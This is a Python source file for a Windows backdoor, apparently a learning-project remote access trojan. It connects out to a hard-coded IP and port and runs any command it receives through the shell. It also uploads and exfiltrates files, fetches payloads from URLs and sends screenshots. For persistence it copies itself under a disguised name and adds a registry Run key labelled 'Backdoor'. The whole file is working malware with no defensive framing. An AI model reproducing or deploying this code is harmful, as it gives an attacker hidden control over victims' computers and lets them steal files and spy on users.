import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests
import mss as mss

def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data)

def reliable_recv():
    data = ""
    while True:
         try:
             data = data + sock.recv(1024)
             return json.loads(data)
         except ValueError:
             continue

def screenshot():
    with mss() as screenshot:
        screenshot.shot()

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
            out_file.write(get_response.content)

def connection():
    while True:
        time.sleep(20)
        try:
            sock.connect(("192.168.128.166", 54321))
            shell()
        except:
            connection()


def shell():
    while True:
        command = reliable_recv()
        if command == 'q':
            break
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            with open(command[9:], "rb") as file:
                reliable_send(base64.b64encode(file.read()))
        elif command[:6] == "upload":
            with open(command[7:], "wb") as fin:
                file_data = reliable_recv()
                fin.write(base64.b64decode(file_data))
        elif command[:3] == "get":
            try:
                download(command[4:])
                reliable_send("[+] Downloaded File From Specified URL!")
            except:
                reliable_send("[!!] Failed To Download That File")
        elif command[:10] == "screenshot":
            try:
                screenshot()
                with open("moniter-1.png", "rb") as sc:
                        reliable_send(base64.b64encode(sc.read()))
                os.remove("moniter-1.png")
            except:
                reliable_send("[!!] Failed To Take Screenshot")
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result)

# mac :/Library/Application Support/
location = os.environ["appdata"] + "\\windows32.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable,location)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d"' + location + '"', shell = True)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()
sock.close()
